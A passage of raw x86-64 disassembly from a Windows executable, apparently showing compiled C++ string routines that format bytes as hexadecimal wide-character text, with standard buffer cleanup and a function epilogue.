   1400016db:	48 89 45 10          	mov    %rax,0x10(%rbp)
   1400016df:	48 8d 45 00          	lea    0x0(%rbp),%rax
   1400016e3:	48 83 fa 07          	cmp    $0x7,%rdx
   1400016e7:	48 0f 47 45 00       	cmova  0x0(%rbp),%rax
   1400016ec:	66 44 89 0c 48       	mov    %r9w,(%rax,%rcx,2)
   1400016f1:	66 44 89 74 48 02    	mov    %r14w,0x2(%rax,%rcx,2)
   1400016f7:	eb 09                	jmp    0x140001702
   1400016f9:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   1400016fd:	e8 ce 1e 00 00       	call   0x1400035d0
   140001702:	0f 10 45 00          	movups 0x0(%rbp),%xmm0
   140001706:	0f 11 45 a0          	movups %xmm0,-0x60(%rbp)
   14000170a:	0f 10 4d 10          	movups 0x10(%rbp),%xmm1
   14000170e:	0f 11 4d b0          	movups %xmm1,-0x50(%rbp)
   140001712:	0f b6 5e 02          	movzbl 0x2(%rsi),%ebx
   140001716:	8b c3                	mov    %ebx,%eax
   140001718:	48 c1 e8 04          	shr    $0x4,%rax
   14000171c:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000171f:	0f 11 45 00          	movups %xmm0,0x0(%rbp)
   140001723:	0f 57 c9             	xorps  %xmm1,%xmm1
   140001726:	f3 0f 7f 4d 10       	movdqu %xmm1,0x10(%rbp)
   14000172b:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001731:	41 0f b7 54 45 00    	movzwl 0x0(%r13,%rax,2),%edx
   140001737:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   14000173b:	e8 10 1c 00 00       	call   0x140003350
   140001740:	90                   	nop
   140001741:	83 e3 0f             	and    $0xf,%ebx
   140001744:	45 0f b7 4c 5d 00    	movzwl 0x0(%r13,%rbx,2),%r9d
   14000174a:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000174e:	48 8b 55 18          	mov    0x18(%rbp),%rdx
   140001752:	48 3b ca             	cmp    %rdx,%rcx
   140001755:	73 22                	jae    0x140001779
   140001757:	48 8d 41 01          	lea    0x1(%rcx),%rax
   14000175b:	48 89 45 10          	mov    %rax,0x10(%rbp)
   14000175f:	48 8d 45 00          	lea    0x0(%rbp),%rax
   140001763:	48 83 fa 07          	cmp    $0x7,%rdx
   140001767:	48 0f 47 45 00       	cmova  0x0(%rbp),%rax
   14000176c:	66 44 89 0c 48       	mov    %r9w,(%rax,%rcx,2)
   140001771:	66 44 89 74 48 02    	mov    %r14w,0x2(%rax,%rcx,2)
   140001777:	eb 09                	jmp    0x140001782
   140001779:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   14000177d:	e8 4e 1e 00 00       	call   0x1400035d0
   140001782:	0f 10 45 00          	movups 0x0(%rbp),%xmm0
   140001786:	0f 11 45 80          	movups %xmm0,-0x80(%rbp)
   14000178a:	0f 10 4d 10          	movups 0x10(%rbp),%xmm1
   14000178e:	0f 11 4d 90          	movups %xmm1,-0x70(%rbp)
   140001792:	0f b6 5e 03          	movzbl 0x3(%rsi),%ebx
   140001796:	8b c3                	mov    %ebx,%eax
   140001798:	48 c1 e8 04          	shr    $0x4,%rax
   14000179c:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000179f:	0f 11 45 00          	movups %xmm0,0x0(%rbp)
   1400017a3:	0f 57 c9             	xorps  %xmm1,%xmm1
   1400017a6:	f3 0f 7f 4d 10       	movdqu %xmm1,0x10(%rbp)
   1400017ab:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400017b1:	41 0f b7 54 45 00    	movzwl 0x0(%r13,%rax,2),%edx
   1400017b7:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   1400017bb:	e8 90 1b 00 00       	call   0x140003350
   1400017c0:	90                   	nop
   1400017c1:	83 e3 0f             	and    $0xf,%ebx
   1400017c4:	45 0f b7 4c 5d 00    	movzwl 0x0(%r13,%rbx,2),%r9d
   1400017ca:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   1400017ce:	48 8b 55 18          	mov    0x18(%rbp),%rdx
   1400017d2:	48 3b ca             	cmp    %rdx,%rcx
   1400017d5:	73 22                	jae    0x1400017f9
   1400017d7:	48 8d 41 01          	lea    0x1(%rcx),%rax
   1400017db:	48 89 45 10          	mov    %rax,0x10(%rbp)
   1400017df:	48 8d 45 00          	lea    0x0(%rbp),%rax
   1400017e3:	48 83 fa 07          	cmp    $0x7,%rdx
   1400017e7:	48 0f 47 45 00       	cmova  0x0(%rbp),%rax
   1400017ec:	66 44 89 0c 48       	mov    %r9w,(%rax,%rcx,2)
   1400017f1:	66 44 89 74 48 02    	mov    %r14w,0x2(%rax,%rcx,2)
   1400017f7:	eb 09                	jmp    0x140001802
   1400017f9:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   1400017fd:	e8 ce 1d 00 00       	call   0x1400035d0
   140001802:	0f 10 4d 00          	movups 0x0(%rbp),%xmm1
   140001806:	0f 11 4c 24 38       	movups %xmm1,0x38(%rsp)
   14000180b:	0f 10 45 10          	movups 0x10(%rbp),%xmm0
   14000180f:	f3 0f 7f 44 24 48    	movdqu %xmm0,0x48(%rsp)
   140001815:	66 49 0f 7e c0       	movq   %xmm0,%r8
   14000181a:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   14000181f:	66 48 0f 7e c1       	movq   %xmm0,%rcx
   140001824:	48 8b c1             	mov    %rcx,%rax
   140001827:	49 2b c0             	sub    %r8,%rax
   14000182a:	48 83 f8 02          	cmp    $0x2,%rax
   14000182e:	0f 82 96 00 00 00    	jb     0x1400018ca
   140001834:	49 8d 40 02          	lea    0x2(%r8),%rax
   140001838:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   14000183d:	48 8d 74 24 38       	lea    0x38(%rsp),%rsi
   140001842:	66 48 0f 7e c8       	movq   %xmm1,%rax
   140001847:	48 83 f9 07          	cmp    $0x7,%rcx
   14000184b:	48 0f 47 f0          	cmova  %rax,%rsi
   14000184f:	48 8d 05 c6 3c 00 00 	lea    0x3cc6(%rip),%rax        # 0x14000551c
   140001856:	4c 8d 3d bb 3c 00 00 	lea    0x3cbb(%rip),%r15        # 0x140005518
   14000185d:	48 3b c6             	cmp    %rsi,%rax
   140001860:	76 1e                	jbe    0x140001880
   140001862:	4a 8d 04 46          	lea    (%rsi,%r8,2),%rax
   140001866:	4c 3b f8             	cmp    %rax,%r15
   140001869:	77 15                	ja     0x140001880
   14000186b:	49 3b f7             	cmp    %r15,%rsi
   14000186e:	77 05                	ja     0x140001875
   140001870:	49 8b de             	mov    %r14,%rbx
   140001873:	eb 10                	jmp    0x140001885
   140001875:	48 8b de             	mov    %rsi,%rbx
   140001878:	49 2b df             	sub    %r15,%rbx
   14000187b:	48 d1 fb             	sar    $1,%rbx
   14000187e:	eb 05                	jmp    0x140001885
   140001880:	bb 02 00 00 00       	mov    $0x2,%ebx
   140001885:	48 8d 4e 04          	lea    0x4(%rsi),%rcx
   140001889:	4e 8d 04 45 02 00 00 	lea    0x2(,%r8,2),%r8
   140001890:	00 
   140001891:	48 8b d6             	mov    %rsi,%rdx
   140001894:	e8 74 33 00 00       	call   0x140004c0d
   140001899:	48 03 db             	add    %rbx,%rbx
   14000189c:	4c 8b c3             	mov    %rbx,%r8
   14000189f:	49 8b d7             	mov    %r15,%rdx
   1400018a2:	48 8b ce             	mov    %rsi,%rcx
   1400018a5:	e8 5d 33 00 00       	call   0x140004c07
   1400018aa:	48 8d 0c 33          	lea    (%rbx,%rsi,1),%rcx
   1400018ae:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   1400018b4:	4c 2b c3             	sub    %rbx,%r8
   1400018b7:	49 8d 57 04          	lea    0x4(%r15),%rdx
   1400018bb:	48 03 d3             	add    %rbx,%rdx
   1400018be:	e8 44 33 00 00       	call   0x140004c07
   1400018c3:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   1400018c8:	eb 16                	jmp    0x1400018e0
   1400018ca:	bb 02 00 00 00       	mov    $0x2,%ebx
   1400018cf:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   1400018d4:	8b d3                	mov    %ebx,%edx
   1400018d6:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   1400018db:	e8 00 23 00 00       	call   0x140003be0
   1400018e0:	0f 10 00             	movups (%rax),%xmm0
   1400018e3:	0f 11 45 20          	movups %xmm0,0x20(%rbp)
   1400018e7:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   1400018eb:	0f 11 4d 30          	movups %xmm1,0x30(%rbp)
   1400018ef:	4c 89 70 10          	mov    %r14,0x10(%rax)
   1400018f3:	b9 07 00 00 00       	mov    $0x7,%ecx
   1400018f8:	48 89 48 18          	mov    %rcx,0x18(%rax)
   1400018fc:	66 44 89 30          	mov    %r14w,(%rax)
   140001900:	4c 8d 4d 80          	lea    -0x80(%rbp),%r9
   140001904:	4c 8d 45 20          	lea    0x20(%rbp),%r8
   140001908:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   14000190c:	e8 7f 20 00 00       	call   0x140003990
   140001911:	90                   	nop
   140001912:	4c 8d 4d a0          	lea    -0x60(%rbp),%r9
   140001916:	4c 8d 45 e0          	lea    -0x20(%rbp),%r8
   14000191a:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   14000191e:	e8 6d 20 00 00       	call   0x140003990
   140001923:	90                   	nop
   140001924:	4c 8d 4c 24 58       	lea    0x58(%rsp),%r9
   140001929:	4c 8d 45 c0          	lea    -0x40(%rbp),%r8
   14000192d:	48 8b cf             	mov    %rdi,%rcx
   140001930:	e8 5b 20 00 00       	call   0x140003990
   140001935:	90                   	nop
   140001936:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
   14000193a:	48 83 fa 07          	cmp    $0x7,%rdx
   14000193e:	76 3a                	jbe    0x14000197a
   140001940:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140001947:	00 
   140001948:	48 8b 4d c0          	mov    -0x40(%rbp),%rcx
   14000194c:	48 8b c1             	mov    %rcx,%rax
   14000194f:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140001956:	72 1c                	jb     0x140001974
   140001958:	48 83 c2 27          	add    $0x27,%rdx
   14000195c:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140001960:	48 2b c1             	sub    %rcx,%rax
   140001963:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140001967:	48 83 f8 1f          	cmp    $0x1f,%rax
   14000196b:	76 07                	jbe    0x140001974
   14000196d:	ff 15 9d 38 00 00    	call   *0x389d(%rip)        # 0x140005210
   140001973:	cc                   	int3
   140001974:	e8 c3 26 00 00       	call   0x14000403c
   140001979:	90                   	nop
   14000197a:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
   14000197e:	48 83 fa 07          	cmp    $0x7,%rdx
   140001982:	76 3a                	jbe    0x1400019be
   140001984:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   14000198b:	00 
   14000198c:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   140001990:	48 8b c1             	mov    %rcx,%rax
   140001993:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000199a:	72 1c                	jb     0x1400019b8
   14000199c:	48 83 c2 27          	add    $0x27,%rdx
   1400019a0:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1400019a4:	48 2b c1             	sub    %rcx,%rax
   1400019a7:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   1400019ab:	48 83 f8 1f          	cmp    $0x1f,%rax
   1400019af:	76 07                	jbe    0x1400019b8
   1400019b1:	ff 15 59 38 00 00    	call   *0x3859(%rip)        # 0x140005210
   1400019b7:	cc                   	int3
   1400019b8:	e8 7f 26 00 00       	call   0x14000403c
   1400019bd:	90                   	nop
   1400019be:	48 8b 55 38          	mov    0x38(%rbp),%rdx
   1400019c2:	48 83 fa 07          	cmp    $0x7,%rdx
   1400019c6:	76 3a                	jbe    0x140001a02
   1400019c8:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   1400019cf:	00 
   1400019d0:	48 8b 4d 20          	mov    0x20(%rbp),%rcx
   1400019d4:	48 8b c1             	mov    %rcx,%rax
   1400019d7:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400019de:	72 1c                	jb     0x1400019fc
   1400019e0:	48 83 c2 27          	add    $0x27,%rdx
   1400019e4:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1400019e8:	48 2b c1             	sub    %rcx,%rax
   1400019eb:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   1400019ef:	48 83 f8 1f          	cmp    $0x1f,%rax
   1400019f3:	76 07                	jbe    0x1400019fc
   1400019f5:	ff 15 15 38 00 00    	call   *0x3815(%rip)        # 0x140005210
   1400019fb:	cc                   	int3
   1400019fc:	e8 3b 26 00 00       	call   0x14000403c
   140001a01:	90                   	nop
   140001a02:	48 8b 54 24 50       	mov    0x50(%rsp),%rdx
   140001a07:	48 83 fa 07          	cmp    $0x7,%rdx
   140001a0b:	76 3a                	jbe    0x140001a47
   140001a0d:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140001a14:	00 
   140001a15:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140001a1a:	48 8b c1             	mov    %rcx,%rax
   140001a1d:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140001a24:	72 1c                	jb     0x140001a42
   140001a26:	48 83 c2 27          	add    $0x27,%rdx
   140001a2a:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140001a2e:	48 2b c1             	sub    %rcx,%rax
   140001a31:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140001a35:	48 83 f8 1f          	cmp    $0x1f,%rax
   140001a39:	76 07                	jbe    0x140001a42
   140001a3b:	ff 15 cf 37 00 00    	call   *0x37cf(%rip)        # 0x140005210
   140001a41:	cc                   	int3
   140001a42:	e8 f5 25 00 00       	call   0x14000403c
   140001a47:	66 0f 6f 05 41 3e 00 	movdqa 0x3e41(%rip),%xmm0        # 0x140005890
   140001a4e:	00 
   140001a4f:	f3 0f 7f 44 24 48    	movdqu %xmm0,0x48(%rsp)
   140001a55:	66 44 89 74 24 38    	mov    %r14w,0x38(%rsp)
   140001a5b:	48 8b 55 98          	mov    -0x68(%rbp),%rdx
   140001a5f:	48 83 fa 07          	cmp    $0x7,%rdx
   140001a63:	76 3a                	jbe    0x140001a9f
   140001a65:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140001a6c:	00 
   140001a6d:	48 8b 4d 80          	mov    -0x80(%rbp),%rcx
   140001a71:	48 8b c1             	mov    %rcx,%rax
   140001a74:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140001a7b:	72 1c                	jb     0x140001a99
   140001a7d:	48 83 c2 27          	add    $0x27,%rdx
   140001a81:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140001a85:	48 2b c1             	sub    %rcx,%rax
   140001a88:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140001a8c:	48 83 f8 1f          	cmp    $0x1f,%rax
   140001a90:	76 07                	jbe    0x140001a99
   140001a92:	ff 15 78 37 00 00    	call   *0x3778(%rip)        # 0x140005210
   140001a98:	cc                   	int3
   140001a99:	e8 9e 25 00 00       	call   0x14000403c
   140001a9e:	90                   	nop
   140001a9f:	48 8b 55 b8          	mov    -0x48(%rbp),%rdx
   140001aa3:	48 83 fa 07          	cmp    $0x7,%rdx
   140001aa7:	76 3a                	jbe    0x140001ae3
   140001aa9:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140001ab0:	00 
   140001ab1:	48 8b 4d a0          	mov    -0x60(%rbp),%rcx
   140001ab5:	48 8b c1             	mov    %rcx,%rax
   140001ab8:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140001abf:	72 1c                	jb     0x140001add
   140001ac1:	48 83 c2 27          	add    $0x27,%rdx
   140001ac5:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140001ac9:	48 2b c1             	sub    %rcx,%rax
   140001acc:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140001ad0:	48 83 f8 1f          	cmp    $0x1f,%rax
   140001ad4:	76 07                	jbe    0x140001add
   140001ad6:	ff 15 34 37 00 00    	call   *0x3734(%rip)        # 0x140005210
   140001adc:	cc                   	int3
   140001add:	e8 5a 25 00 00       	call   0x14000403c
   140001ae2:	90                   	nop
   140001ae3:	48 8b 54 24 70       	mov    0x70(%rsp),%rdx
   140001ae8:	48 83 fa 07          	cmp    $0x7,%rdx
   140001aec:	0f 86 b3 02 00 00    	jbe    0x140001da5
   140001af2:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140001af9:	00 
   140001afa:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140001aff:	48 8b c1             	mov    %rcx,%rax
   140001b02:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140001b09:	72 1c                	jb     0x140001b27
   140001b0b:	48 83 c2 27          	add    $0x27,%rdx
   140001b0f:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140001b13:	48 2b c1             	sub    %rcx,%rax
   140001b16:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140001b1a:	48 83 f8 1f          	cmp    $0x1f,%rax
   140001b1e:	76 07                	jbe    0x140001b27
   140001b20:	ff 15 ea 36 00 00    	call   *0x36ea(%rip)        # 0x140005210
   140001b26:	cc                   	int3
   140001b27:	e8 10 25 00 00       	call   0x14000403c
   140001b2c:	e9 74 02 00 00       	jmp    0x140001da5
   140001b31:	48 8b 59 08          	mov    0x8(%rcx),%rbx
   140001b35:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140001b3a:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001b3d:	0f 11 45 20          	movups %xmm0,0x20(%rbp)
   140001b41:	49 8b d6             	mov    %r14,%rdx
   140001b44:	48 89 55 30          	mov    %rdx,0x30(%rbp)
   140001b48:	b9 07 00 00 00       	mov    $0x7,%ecx
   140001b4d:	48 89 4d 38          	mov    %rcx,0x38(%rbp)
   140001b51:	66 44 89 75 20       	mov    %r14w,0x20(%rbp)
   140001b56:	49 8b f6             	mov    %r14,%rsi
   140001b59:	66 45 3b 37          	cmp    (%r15),%r14w
   140001b5d:	0f 83 a2 01 00 00    	jae    0x140001d05
   140001b63:	4c 8d 2d fe 3c 00 00 	lea    0x3cfe(%rip),%r13        # 0x140005868
   140001b6a:	41 b8 20 00 00 00    	mov    $0x20,%r8d
   140001b70:	48 85 f6             	test   %rsi,%rsi
   140001b73:	74 2c                	je     0x140001ba1
   140001b75:	48 3b d1             	cmp    %rcx,%rdx
   140001b78:	73 1b                	jae    0x140001b95
   140001b7a:	48 8d 42 01          	lea    0x1(%rdx),%rax
   140001b7e:	48 89 45 30          	mov    %rax,0x30(%rbp)
   140001b82:	48 8d 45 20          	lea    0x20(%rbp),%rax
   140001b86:	48 83 f9 07          	cmp    $0x7,%rcx
   140001b8a:	48 0f 47 45 20       	cmova  0x20(%rbp),%rax
   140001b8f:	44 89 04 50          	mov    %r8d,(%rax,%rdx,2)
   140001b93:	eb 0c                	jmp    0x140001ba1
   140001b95:	45 8b c8             	mov    %r8d,%r9d
   140001b98:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   140001b9c:	e8 2f 1a 00 00       	call   0x1400035d0
   140001ba1:	0f b6 1c 1e          	movzbl (%rsi,%rbx,1),%ebx
   140001ba5:	8b c3                	mov    %ebx,%eax
   140001ba7:	48 c1 e8 04          	shr    $0x4,%rax
   140001bab:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001bae:	0f 11 45 00          	movups %xmm0,0x0(%rbp)
   140001bb2:	4c 89 75 10          	mov    %r14,0x10(%rbp)
   140001bb6:	4c 89 75 18          	mov    %r14,0x18(%rbp)
   140001bba:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001bc0:	41 0f b7 54 45 00    	movzwl 0x0(%r13,%rax,2),%edx
   140001bc6:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   140001bca:	e8 81 17 00 00       	call   0x140003350
   140001bcf:	90                   	nop
   140001bd0:	83 e3 0f             	and    $0xf,%ebx
   140001bd3:	45 0f b7 4c 5d 00    	movzwl 0x0(%r13,%rbx,2),%r9d
   140001bd9:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   140001bdd:	48 8b 55 18          	mov    0x18(%rbp),%rdx
   140001be1:	48 3b ca             	cmp    %rdx,%rcx
   140001be4:	73 22                	jae    0x140001c08
   140001be6:	48 8d 41 01          	lea    0x1(%rcx),%rax
   140001bea:	48 89 45 10          	mov    %rax,0x10(%rbp)
   140001bee:	48 8d 45 00          	lea    0x0(%rbp),%rax
   140001bf2:	48 83 fa 07          	cmp    $0x7,%rdx
   140001bf6:	48 0f 47 45 00       	cmova  0x0(%rbp),%rax
   140001bfb:	66 44 89 0c 48       	mov    %r9w,(%rax,%rcx,2)
   140001c00:	66 44 89 74 48 02    	mov    %r14w,0x2(%rax,%rcx,2)
   140001c06:	eb 09                	jmp    0x140001c11
   140001c08:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   140001c0c:	e8 bf 19 00 00       	call   0x1400035d0
   140001c11:	0f 10 45 00          	movups 0x0(%rbp),%xmm0
   140001c15:	0f 11 44 24 58       	movups %xmm0,0x58(%rsp)
   140001c1a:	0f 10 4d 10          	movups 0x10(%rbp),%xmm1
   140001c1e:	0f 11 4c 24 68       	movups %xmm1,0x68(%rsp)
   140001c23:	4c 8d 4c 24 58       	lea    0x58(%rsp),%r9
   140001c28:	66 48 0f 7e c1       	movq   %xmm0,%rcx
   140001c2d:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   140001c31:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   140001c36:	66 48 0f 7e c0       	movq   %xmm0,%rax
   140001c3b:	48 83 f8 07          	cmp    $0x7,%rax
   140001c3f:	4c 0f 47 c9          	cmova  %rcx,%r9
   140001c43:	4c 8b 65 30          	mov    0x30(%rbp),%r12
   140001c47:	48 8b 4d 38          	mov    0x38(%rbp),%rcx
   140001c4b:	48 8b c1             	mov    %rcx,%rax
   140001c4e:	49 2b c4             	sub    %r12,%rax
   140001c51:	66 49 0f 7e ce       	movq   %xmm1,%r14
   140001c56:	4c 3b f0             	cmp    %rax,%r14
   140001c59:	77 33                	ja     0x140001c8e
   140001c5b:	4b 8d 04 26          	lea    (%r14,%r12,1),%rax
   140001c5f:	48 89 45 30          	mov    %rax,0x30(%rbp)
   140001c63:	48 8d 5d 20          	lea    0x20(%rbp),%rbx
   140001c67:	48 83 f9 07          	cmp    $0x7,%rcx
   140001c6b:	48 0f 47 5d 20       	cmova  0x20(%rbp),%rbx
   140001c70:	4a 8d 0c 63          	lea    (%rbx,%r12,2),%rcx
   140001c74:	4f 8d 04 36          	lea    (%r14,%r14,1),%r8
   140001c78:	49 8b d1             	mov    %r9,%rdx
   140001c7b:	e8 8d 2f 00 00       	call   0x140004c0d
   140001c80:	4b 8d 04 26          	lea    (%r14,%r12,1),%rax
   140001c84:	45 33 f6             	xor    %r14d,%r14d
   140001c87:	66 44 89 34 43       	mov    %r14w,(%rbx,%rax,2)
   140001c8c:	eb 14                	jmp    0x140001ca2
   140001c8e:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140001c93:	49 8b d6             	mov    %r14,%rdx
   140001c96:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   140001c9a:	e8 e1 1a 00 00       	call   0x140003780
   140001c9f:	45 33 f6             	xor    %r14d,%r14d
   140001ca2:	48 8b 54 24 70       	mov    0x70(%rsp),%rdx
   140001ca7:	48 83 fa 07          	cmp    $0x7,%rdx
   140001cab:	76 33                	jbe    0x140001ce0
   140001cad:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140001cb4:	00 
   140001cb5:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140001cba:	48 8b c1             	mov    %rcx,%rax
   140001cbd:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140001cc4:	72 15                	jb     0x140001cdb
   140001cc6:	48 83 c2 27          	add    $0x27,%rdx
   140001cca:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140001cce:	48 2b c1             	sub    %rcx,%rax
   140001cd1:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140001cd5:	48 83 f8 1f          	cmp    $0x1f,%rax
   140001cd9:	77 23                	ja     0x140001cfe
   140001cdb:	e8 5c 23 00 00       	call   0x14000403c
   140001ce0:	48 ff c6             	inc    %rsi
   140001ce3:	41 0f b7 07          	movzwl (%r15),%eax
   140001ce7:	48 3b f0             	cmp    %rax,%rsi
   140001cea:	73 19                	jae    0x140001d05
   140001cec:	48 8b 4d 38          	mov    0x38(%rbp),%rcx
   140001cf0:	48 8b 55 30          	mov    0x30(%rbp),%rdx
   140001cf4:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001cf9:	e9 6c fe ff ff       	jmp    0x140001b6a
   140001cfe:	ff 15 0c 35 00 00    	call   *0x350c(%rip)        # 0x140005210
   140001d04:	cc                   	int3
   140001d05:	0f 10 45 20          	movups 0x20(%rbp),%xmm0
   140001d09:	0f 11 07             	movups %xmm0,(%rdi)
   140001d0c:	0f 10 4d 30          	movups 0x30(%rbp),%xmm1
   140001d10:	0f 11 4f 10          	movups %xmm1,0x10(%rdi)
   140001d14:	e9 8c 00 00 00       	jmp    0x140001da5
   140001d19:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001d1c:	0f 11 45 00          	movups %xmm0,0x0(%rbp)
   140001d20:	0f 57 c9             	xorps  %xmm1,%xmm1
   140001d23:	f3 0f 7f 4d 10       	movdqu %xmm1,0x10(%rbp)
   140001d28:	44 0f b7 01          	movzwl (%rcx),%r8d
   140001d2c:	49 d1 e8             	shr    $1,%r8
   140001d2f:	33 d2                	xor    %edx,%edx
   140001d31:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   140001d35:	e8 16 16 00 00       	call   0x140003350
   140001d3a:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   140001d3e:	48 83 7d 18 07       	cmpq   $0x7,0x18(%rbp)
   140001d43:	48 0f 47 4d 00       	cmova  0x0(%rbp),%rcx
   140001d48:	41 0f b7 17          	movzwl (%r15),%edx
   140001d4c:	48 83 e2 fe          	and    $0xfffffffffffffffe,%rdx
   140001d50:	4d 8b 47 08          	mov    0x8(%r15),%r8
   140001d54:	76 1b                	jbe    0x140001d71
   140001d56:	4c 2b c1             	sub    %rcx,%r8
   140001d59:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001d60:	41 0f b6 04 08       	movzbl (%r8,%rcx,1),%eax
   140001d65:	88 01                	mov    %al,(%rcx)
   140001d67:	48 8d 49 01          	lea    0x1(%rcx),%rcx
   140001d6b:	48 83 ea 01          	sub    $0x1,%rdx
   140001d6f:	75 ef                	jne    0x140001d60
   140001d71:	0f 10 45 00          	movups 0x0(%rbp),%xmm0
   140001d75:	0f 11 07             	movups %xmm0,(%rdi)
   140001d78:	0f 10 4d 10          	movups 0x10(%rbp),%xmm1
   140001d7c:	0f 11 4f 10          	movups %xmm1,0x10(%rdi)
   140001d80:	eb 23                	jmp    0x140001da5
   140001d82:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001d85:	0f 11 07             	movups %xmm0,(%rdi)
   140001d88:	4c 89 77 10          	mov    %r14,0x10(%rdi)
   140001d8c:	4c 89 77 18          	mov    %r14,0x18(%rdi)
   140001d90:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140001d96:	48 8d 15 83 37 00 00 	lea    0x3783(%rip),%rdx        # 0x140005520
   140001d9d:	48 8b cf             	mov    %rdi,%rcx
   140001da0:	e8 eb 16 00 00       	call   0x140003490
   140001da5:	48 8b c7             	mov    %rdi,%rax
   140001da8:	48 8b 4d 40          	mov    0x40(%rbp),%rcx
   140001dac:	48 33 cc             	xor    %rsp,%rcx
   140001daf:	e8 ec 1f 00 00       	call   0x140003da0
   140001db4:	48 8b 9c 24 a0 01 00 	mov    0x1a0(%rsp),%rbx
   140001dbb:	00 
   140001dbc:	48 81 c4 50 01 00 00 	add    $0x150,%rsp
   140001dc3:	41 5f                	pop    %r15
   140001dc5:	41 5e                	pop    %r14
   140001dc7:	41 5d                	pop    %r13
   140001dc9:	41 5c                	pop    %r12
   140001dcb:	5f                   	pop    %rdi
   140001dcc:	5e                   	pop    %rsi
   140001dcd:	5d                   	pop    %rbp
   140001dce:	c3                   	ret
   140001dcf:	cc                   	int3
   140001dd0:	48 8b c4             	mov    %rsp,%rax
   140001dd3:	48 89 58 18          	mov    %rbx,0x18(%rax)
   140001dd7:	55                   	push   %rbp
   140001dd8:	56                   	push   %rsi
   140001dd9:	57                   	push   %rdi
   140001dda:	48 8d 68 a1          	lea    -0x5f(%rax),%rbp
   140001dde:	48 81 ec e0 00 00 00 	sub    $0xe0,%rsp
   140001de5:	0f 29 70 d8          	movaps %xmm6,-0x28(%rax)
   140001de9:	0f 29 78 c8          	movaps %xmm7,-0x38(%rax)
   140001ded:	4c 8b ca             	mov    %rdx,%r9
   140001df0:	48 8b f9             	mov    %rcx,%rdi
   140001df3:	33 f6                	xor    %esi,%esi
   140001df5:	8b 4a 30             	mov    0x30(%rdx),%ecx
   140001df8:	85 c9                	test   %ecx,%ecx
   140001dfa:	0f 84 78 02 00 00    	je     0x140002078
   140001e00:	39 77 30             	cmp    %esi,0x30(%rdi)
